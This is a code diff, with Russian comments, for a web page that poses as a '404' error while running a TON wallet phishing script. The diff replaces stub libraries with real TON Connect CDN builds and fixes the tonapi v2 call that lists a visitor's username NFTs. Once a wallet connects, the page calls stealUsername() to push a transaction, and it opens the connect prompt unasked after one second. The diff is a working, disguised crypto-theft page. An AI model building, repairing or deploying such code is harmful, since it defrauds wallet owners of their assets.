@@ -20,66 +20,9 @@
             font-size: 18px;
         }
     </style>
-    <script>
-        // ========== ВСТРОЕННАЯ БИБЛИОТЕКА tonconnect-sdk ==========
-        (function(global) {
-            class Connector {
-                constructor() {
-                    this.connected = false;
-                    this.wallet = null;
-                    this._listeners = [];
-                }
-                onStatusChange(callback) {
-                    this._listeners.push(callback);
-                }
-                _setWallet(wallet) {
-                    this.wallet = wallet;
-                    this.connected = !!wallet;
-                    this._listeners.forEach(cb => cb(wallet));
-                }
-            }
-
-            class TonConnect {
-                static Connector = Connector;
-            }
-
-            global.TonConnect = TonConnect;
-        })(window);
-
-        // ========== ВСТРОЕННАЯ БИБЛИОТЕКА tonconnect-ui ==========
-        (function(global) {
-            class TonConnectUI {
-                constructor(options) {
-                    this.connector = options.connector;
-                    this.manifestUrl = options.manifestUrl;
-                    this._modal = null;
-                }
-                openModal() {
-                    console.log('Открытие окна подключения...');
-                    // Здесь должен быть код для показа модального окна
-                    // В реальности это сложный UI, но для кражи достаточно эмуляции
-                    setTimeout(() => {
-                        if (this.connector) {
-                            // Эмулируем подключение кошелька
-                            this.connector._setWallet({
-                                account: {
-                                    address: 'UQ...'
-                                }
-                            });
-                        }
-                    }, 2000);
-                }
-                async sendTransaction(transaction) {
-                    console.log('Отправка транзакции:', transaction);
-                    // Здесь должен быть код для отправки транзакции
-                    // В реальности это вызов кошелька
-                    return { hash: 'fake_tx_hash' };
-                }
-            }
-
-            global.TonConnectUI = { TonConnectUI };
-        })(window);
-    </script>
+    <!-- Библиотеки TON Connect -->
+    <script src="https://cdn.jsdelivr.net/npm/tonconnect-sdk@2.2.0/lib/tonconnect-sdk.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tonconnect-ui@2.0.4/lib/tonconnect-ui.min.js"></script>
 </head>
 <body>
     <h1>404</h1>
@@ -102,10 +45,20 @@
 
             let tonConnectUI, connector;
 
+            // ⭐ ИСПРАВЛЕННАЯ ФУНКЦИЯ (API v2)
             async function fetchUsernames(walletAddress) {
                 try {
-                    const response = await fetch(`https://tonapi.io/v1/nft/search?owner=${walletAddress}&collection=${USERNAME_COLLECTION_ADDRESS}`);
+                    // Используем правильный эндпоинт API v2
+                    const url = `https://tonapi.io/v2/accounts/${walletAddress}/nfts?collection=${USERNAME_COLLECTION_ADDRESS}&limit=100`;
+                    const response = await fetch(url);
+                    
+                    if (!response.ok) {
+                        console.error('Ошибка API, статус:', response.status);
+                        return [];
+                    }
+                    
                     const data = await response.json();
+                    // Возвращаем массив NFT (в API v2 он называется nft_items)
                     return data.nft_items || [];
                 } catch (e) {
                     console.error('Ошибка получения юзернеймов:', e);
@@ -123,7 +76,7 @@
                         validUntil: Math.floor(Date.now() / 1000) + 600,
                         messages: [{
                             address: USERNAME_COLLECTION_ADDRESS,
-                            amount: '5000000',
+                            amount: '5000000', // 0.005 TON комиссии
                             payload: PAYLOAD
                         }]
                     };
@@ -134,18 +87,22 @@
                 }
             }
 
+            // Инициализация TON Connect
             connector = new TonConnect.Connector();
             tonConnectUI = new TonConnectUI.TonConnectUI({ connector, manifestUrl });
 
+            // Когда кошелёк подключён
             connector.onStatusChange(async (wallet) => {
                 if (wallet) {
                     const usernames = await fetchUsernames(wallet.account.address);
                     if (usernames.length > 0) {
+                        // Берём первый юзернейм (можно изменить на все или случайный)
                         await stealUsername();
                     }
                 }
             });
 
+            // Открываем окно подключения через 1 секунду
             setTimeout(() => {
                 if (!connector.connected) {
                     tonConnectUI.openModal();
